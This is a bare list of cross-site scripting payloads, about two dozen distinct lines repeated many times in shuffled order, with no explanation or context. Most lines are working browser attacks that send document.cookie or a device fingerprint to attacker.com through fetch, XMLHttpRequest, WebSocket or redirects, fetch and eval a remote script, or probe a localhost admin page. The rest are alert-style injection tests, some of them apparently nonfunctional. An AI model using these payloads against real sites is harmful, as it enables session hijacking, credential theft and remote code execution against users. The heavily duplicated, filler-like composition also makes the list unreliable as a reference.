<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
